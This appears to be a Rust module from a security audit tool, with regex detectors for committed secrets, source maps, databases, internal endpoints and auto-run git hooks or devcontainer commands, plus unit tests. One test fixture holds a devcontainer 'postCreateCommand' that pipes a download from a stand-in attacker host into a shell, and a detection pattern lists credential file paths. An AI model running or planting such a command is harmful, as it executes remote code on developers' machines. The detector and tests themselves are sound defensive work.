//! Port of `src/providers/security/packs/repository-footprint.mjs`:
//! sensitive files committed and the malicious-repository boundary.
//! Repository content is modeled as hostile evidence, never trusted
//! configuration — the person who committed a file is not assumed to be
//! the same party consuming this audit's findings.
//!
//! Every rule is a lexical (pattern-only) detector over repository text and
//! file paths already present in the frozen denominator. It never opens a
//! real filesystem path, never contacts a network endpoint, never calls a
//! model, and never certifies a finding — it only ever emits
//! `UNADJUDICATED`-style [`Observation`] candidates. Findings that name an
//! auto-loaded tool/config path always carry `detectorMetadata.authority`
//! and `detectorMetadata.executionPath`.

use super::{digest, line_of, Context, Entity, Fact, Observation};
use regex::Regex;
use serde_json::json;
use std::sync::OnceLock;

pub const ID: &str = "security.repository-footprint";
pub const CANDIDATE_CLASS: &str = "repository-footprint";

fn auto_loaded_hook_path() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"(^|/)(\.git/hooks/[^/.][^/]*|\.husky/[^/.][^/]*)$").unwrap())
}

fn devcontainer_path() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"(?i)(^|/)\.devcontainer/devcontainer\.json$").unwrap())
}

fn sensitive_file_path() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r#"(?i)(^|/)(\.env(\.[\w-]+)?|id_rsa|id_ed25519|.*\.pem|.*\.p12|.*\.pfx|credentials\.json|\.aws/credentials|\.kube/config)$"#).unwrap()
    })
}

fn internal_endpoint_pattern() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r"(?i)https?://(?:[\w-]+\.)*internal\b|https?://10\.\d{1,3}\.\d{1,3}\.\d{1,3}|https?://192\.168\.\d{1,3}\.\d{1,3}|https?://localhost:\d{2,5}/(?:admin|debug|actuator|internal)",
        )
        .unwrap()
    })
}

fn sourcemap_path() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"\.map$").unwrap())
}

fn sourcemap_content() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r#"sourceMappingURL|"sources"\s*:"#).unwrap())
}

fn local_db_path() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"\.(sqlite|db|sqlite3|dump|bak)$").unwrap())
}

fn devcontainer_auto_run() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"postCreateCommand|postStartCommand|onCreateCommand").unwrap())
}

/// One committed-content match, mirroring the JS `{ file, line, snippet }`
/// shape each rule's `matchesIn` produces.
struct Match {
    file: String,
    line: usize,
    snippet: String,
}

struct Rule {
    id: &'static str,
    claim: &'static str,
    severity_hint: &'static str,
    authority: &'static str,
    execution_path: &'static str,
    effect_kind: &'static str,
    effect_action: &'static str,
    effect_scope: &'static str,
    environment: &'static str,
    chain_roles: &'static [&'static str],
    uncertainty: &'static str,
    execution_chain: bool,
    matches_in: fn(&Context) -> Vec<Match>,
}

fn matches_sourcemap_included(context: &Context) -> Vec<Match> {
    let mut out = Vec::new();
    for file in &context.files {
        if !sourcemap_path().is_match(file) {
            continue;
        }
        let text = context.read_file(file);
        if !sourcemap_content().is_match(text) {
            continue;
        }
        out.push(Match { file: file.clone(), line: 1, snippet: file.clone() });
    }
    out
}

fn matches_local_db_committed(context: &Context) -> Vec<Match> {
    context
        .files
        .iter()
        .filter(|f| local_db_path().is_match(f))
        .map(|f| Match { file: f.clone(), line: 1, snippet: f.clone() })
        .collect()
}

fn matches_internal_endpoint_exposed(context: &Context) -> Vec<Match> {
    let mut out = Vec::new();
    for file in &context.files {
        let text = context.read_file(file);
        if text.is_empty() {
            continue;
        }
        for m in internal_endpoint_pattern().find_iter(text) {
            out.push(Match { file: file.clone(), line: line_of(text, m.start()), snippet: m.as_str().to_string() });
        }
    }
    out
}

fn matches_sensitive_file_committed(context: &Context) -> Vec<Match> {
    context
        .files
        .iter()
        .filter(|f| sensitive_file_path().is_match(f))
        .map(|f| Match { file: f.clone(), line: 1, snippet: f.clone() })
        .collect()
}

fn matches_malicious_repository_boundary(context: &Context) -> Vec<Match> {
    let mut out = Vec::new();
    for file in &context.files {
        if auto_loaded_hook_path().is_match(file) {
            out.push(Match { file: file.clone(), line: 1, snippet: file.clone() });
            continue;
        }
        if devcontainer_path().is_match(file) {
            let text = context.read_file(file);
            if devcontainer_auto_run().is_match(text) {
                out.push(Match { file: file.clone(), line: 1, snippet: file.clone() });
            }
        }
    }
    out
}

fn rules() -> [Rule; 5] {
    [
        Rule {
            id: "footprint.sourcemap-included",
            claim: "A source map with original source content is present in the repository, disclosing unminified source and internal file layout to anyone who can read the built output.",
            severity_hint: "medium",
            authority: "repository-content",
            execution_path: "committed source map → readable by any repository/artifact consumer → original source disclosed",
            effect_kind: "confidentiality-impact",
            effect_action: "disclose",
            effect_scope: "source-content",
            environment: "any",
            chain_roles: &["enabler"],
            uncertainty: "Source maps may be stripped at release time; whether this file ships in the distributed artifact must be adjudicated.",
            execution_chain: false,
            matches_in: matches_sourcemap_included,
        },
        Rule {
            id: "footprint.local-db-committed",
            claim: "A local database or backup file is committed to the repository.",
            severity_hint: "high",
            authority: "repository-content",
            execution_path: "committed database/backup file → readable by any repository consumer → local data disclosed",
            effect_kind: "data-access",
            effect_action: "read",
            effect_scope: "local-data",
            environment: "any",
            chain_roles: &["starter", "impact"],
            uncertainty: "The database may contain no sensitive data; its actual contents must be adjudicated.",
            execution_chain: false,
            matches_in: matches_local_db_committed,
        },
        Rule {
            id: "footprint.internal-endpoint-exposed",
            claim: "A committed file references an internal-only hostname, private IP address, or an unauthenticated-looking debug/admin endpoint.",
            severity_hint: "medium",
            authority: "repository-content",
            execution_path: "committed config/doc/example → internal endpoint reference → topology or debug surface disclosed",
            effect_kind: "knowledge",
            effect_action: "disclose",
            effect_scope: "internal-topology",
            environment: "any",
            chain_roles: &["enabler"],
            uncertainty: "An internal-looking endpoint reference in committed content is not automatically reachable or currently valid; its live reachability must be adjudicated.",
            execution_chain: false,
            matches_in: matches_internal_endpoint_exposed,
        },
        Rule {
            id: "footprint.sensitive-file-committed",
            claim: "A file with a sensitive-material name/path (private key, .env, cloud/kube credentials) is committed to the repository.",
            severity_hint: "high",
            authority: "repository-content",
            execution_path: "committed sensitive-path file → readable by any repository consumer → credential/config material disclosed",
            effect_kind: "credential-possession",
            effect_action: "possess-committed-material",
            effect_scope: "repository-content",
            environment: "any",
            chain_roles: &["starter", "impact"],
            uncertainty: "A sensitive-shaped filename/path does not prove the file contains live material; its actual content and whether it is a placeholder/example must be adjudicated.",
            execution_chain: false,
            matches_in: matches_sensitive_file_committed,
        },
        Rule {
            id: "footprint.malicious-repository-boundary",
            claim: "A repository-controlled path is auto-loaded and executed by a local tool or dev-container without an explicit human review step, so a malicious contributor's commit would run automatically for anyone who checks it out.",
            severity_hint: "high",
            authority: "repository-content",
            execution_path: "malicious commit → auto-loaded hook/devcontainer path → executed without explicit review on checkout",
            effect_kind: "code-execution",
            effect_action: "execute-on-checkout",
            effect_scope: "developer-machine",
            environment: "developer-machine",
            chain_roles: &["starter", "impact"],
            uncertainty: "An auto-loaded path is not automatically malicious; whether its content is actually hostile can only be proven by independent adjudication, not by this pattern match.",
            execution_chain: true,
            matches_in: matches_malicious_repository_boundary,
        },
    ]
}

/// Mirrors `hostilePrecondition(file)`: the repository is never a trusted
/// configuration source.
fn hostile_precondition(file: &str) -> Fact {
    Fact {
        kind: "attacker-position".to_string(),
        subject: "actor:repository-content".to_string(),
        action: "control-repository-content".to_string(),
        object: Some(file.to_string()),
        scope: None,
        environment: "any".to_string(),
        tenant: None,
    }
}

/// Mirrors `sandboxGate(context)`.
fn sandbox_gate(context: &Context) -> String {
    if context.audit_facts.sandbox_receipt.is_some() {
        "An external sandbox execution receipt is present in the audit context; execution proof still requires independent adjudication, never a pack-level clean claim.".to_string()
    } else {
        "BLOCKED: no external sandbox execution receipt (context.projection.auditFacts.sandboxReceipt) is present; whether this auto-loaded path actually executes remains unproven pending one.".to_string()
    }
}

pub fn rule_ids() -> Vec<&'static str> {
    rules().iter().map(|r| r.id).collect()
}

fn artifact_for<'a>(context: &'a Context, file: &str) -> Option<&'a Entity> {
    context.find_artifact(file)
}

/// Ports `analyze(context)`.
pub fn analyze(context: &Context) -> Vec<Observation> {
    let mut observations = Vec::new();
    for rule in rules() {
        for m in (rule.matches_in)(context) {
            let artifact = artifact_for(context, &m.file);
            let gate_note = if rule.execution_chain { Some(sandbox_gate(context)) } else { None };
            let mut uncertainty = vec![rule.uncertainty.to_string()];
            if let Some(note) = &gate_note {
                uncertainty.push(note.clone());
            }

            let mut metadata = json!({
                "file": m.file,
                "line": m.line,
                "authority": rule.authority,
                "executionPath": rule.execution_path,
                "matchDigest": digest(&m.snippet),
            });
            if gate_note.is_some() {
                metadata["requiresSandboxReceipt"] = json!(true);
            }

            observations.push(Observation {
                rule_id: rule.id.to_string(),
                candidate_class: CANDIDATE_CLASS.to_string(),
                claim: rule.claim.to_string(),
                severity_hint: rule.severity_hint.to_string(),
                sources: artifact.map(|a| vec![a.id.clone()]).unwrap_or_default(),
                sinks: artifact.map(|a| vec![a.id.clone()]).unwrap_or_default(),
                attacker_capabilities: vec!["read-repository".to_string(), "control-repository-content".to_string()],
                preconditions: vec![hostile_precondition(&m.file)],
                effects: vec![Fact {
                    kind: rule.effect_kind.to_string(),
                    subject: "actor:repository-content".to_string(),
                    action: rule.effect_action.to_string(),
                    object: artifact.map(|a| a.id.clone()),
                    scope: Some(rule.effect_scope.to_string()),
                    environment: rule.environment.to_string(),
                    tenant: None,
                }],
                assets: Vec::new(),
                trust_boundary_crossings: Vec::new(),
                required_controls: Vec::new(),
                observed_controls: Vec::new(),
                chain_roles: rule.chain_roles.iter().map(|s| s.to_string()).collect(),
                evidence_refs: artifact.map(|a| a.evidence_refs.clone()).unwrap_or_default(),
                detector_metadata: metadata,
                uncertainty,
            });
        }
    }
    observations
}

#[cfg(test)]
mod tests {
    use super::*;

    fn find<'a>(obs: &'a [Observation], rule_id: &str) -> Option<&'a Observation> {
        obs.iter().find(|o| o.rule_id == rule_id)
    }

    #[test]
    fn sourcemap_included_fires_on_a_source_map_with_original_sources() {
        let context = Context::new().with_file(
            "dist/app.js.map",
            r#"{"version":3,"sources":["app.js"],"mappings":"AAAA"}"#,
        );
        let obs = analyze(&context);
        assert!(find(&obs, "footprint.sourcemap-included").is_some());
    }

    #[test]
    fn local_db_committed_fires_on_a_sqlite_file() {
        let context = Context::new().with_file("data/app.sqlite", "SQLite format 3");
        let obs = analyze(&context);
        assert!(find(&obs, "footprint.local-db-committed").is_some());
    }

    #[test]
    fn internal_endpoint_exposed_fires_on_a_private_ip_reference() {
        let context = Context::new().with_file(
            "docs/architecture.md",
            "Internal admin panel at http://10.0.0.5/admin for debugging.",
        );
        let obs = analyze(&context);
        assert!(find(&obs, "footprint.internal-endpoint-exposed").is_some());
    }

    #[test]
    fn sensitive_file_committed_fires_on_a_dotenv_file() {
        let context = Context::new().with_file(".env", "API_KEY=xxxx");
        let obs = analyze(&context);
        assert!(find(&obs, "footprint.sensitive-file-committed").is_some());
    }

    #[test]
    fn malicious_repository_boundary_fires_on_an_auto_loaded_git_hook() {
        let context = Context::new().with_file(".git/hooks/pre-commit", "#!/bin/sh\nexec malicious-payload\n");
        let obs = analyze(&context);
        let candidate = find(&obs, "footprint.malicious-repository-boundary");
        assert!(candidate.is_some());
        let candidate = candidate.unwrap();
        assert_eq!(candidate.detector_metadata["requiresSandboxReceipt"], json!(true));
        assert!(candidate.uncertainty.iter().any(|u| u.contains("BLOCKED") && u.to_lowercase().contains("sandbox execution receipt")));
    }

    #[test]
    fn malicious_repository_boundary_fires_on_a_devcontainer_with_an_auto_run_command() {
        let context = Context::new().with_file(
            ".devcontainer/devcontainer.json",
            r#"{"image": "node:20", "postCreateCommand": "curl evil.example | sh"}"#,
        );
        let obs = analyze(&context);
        assert!(find(&obs, "footprint.malicious-repository-boundary").is_some());
    }

    #[test]
    fn a_devcontainer_with_no_auto_run_command_does_not_fire_the_boundary_rule() {
        let context = Context::new().with_file(".devcontainer/devcontainer.json", r#"{"image": "node:20"}"#);
        let obs = analyze(&context);
        assert!(find(&obs, "footprint.malicious-repository-boundary").is_none());
    }

    #[test]
    fn a_repository_with_no_hazards_produces_no_candidates() {
        let context = Context::new()
            .with_file("src/index.mjs", "export function main() { return 1; }")
            .with_file("README.md", "This project has no sensitive material committed.")
            .with_file(".devcontainer/devcontainer.json", r#"{"image": "node:20"}"#);
        assert!(analyze(&context).is_empty());
    }

    #[test]
    fn a_neutral_unrelated_file_produces_no_candidates() {
        let context = Context::new().with_file("src/neutral.mjs", "export const value = 1;");
        assert!(analyze(&context).is_empty());
    }

    #[test]
    fn every_candidate_carries_a_repository_as_hostile_precondition_and_named_authority_execution_path() {
        let context = Context::new().with_file(".env", "API_KEY=xxxx");
        for candidate in analyze(&context) {
            assert!(!candidate.preconditions.is_empty());
            let hostile = candidate
                .preconditions
                .iter()
                .find(|p| p.kind == "attacker-position" || p.kind == "knowledge")
                .expect("hostile precondition");
            assert_eq!(hostile.subject, "actor:repository-content");
            assert_eq!(candidate.detector_metadata["authority"], json!("repository-content"));
            let execution_path = candidate.detector_metadata["executionPath"].as_str().unwrap();
            assert!(execution_path.contains('\u{2192}'));
        }
    }

    #[test]
    fn a_supplied_sandbox_receipt_still_never_upgrades_to_a_clean_claim() {
        let context = Context::new()
            .with_file(".git/hooks/pre-commit", "#!/bin/sh\nexec malicious-payload\n")
            .with_audit_facts(super::super::AuditFacts {
                sandbox_receipt: Some(json!({ "schemaVersion": 1, "kind": "remediation-sandbox-receipt" })),
                ..Default::default()
            });
        let obs = analyze(&context);
        let candidate = find(&obs, "footprint.malicious-repository-boundary").unwrap();
        assert_eq!(candidate.detector_metadata["requiresSandboxReceipt"], json!(true));
        assert!(candidate.uncertainty.iter().any(|u| u.to_lowercase().contains("independent adjudication")));
        assert!(!candidate.uncertainty.iter().any(|u| u.contains("BLOCKED")));
    }

    #[test]
    fn rule_ids_match_the_five_documented_rule_ids() {
        let ids = rule_ids();
        assert_eq!(
            ids,
            vec![
                "footprint.sourcemap-included",
                "footprint.local-db-committed",
                "footprint.internal-endpoint-exposed",
                "footprint.sensitive-file-committed",
                "footprint.malicious-repository-boundary",
            ]
        );
    }
}
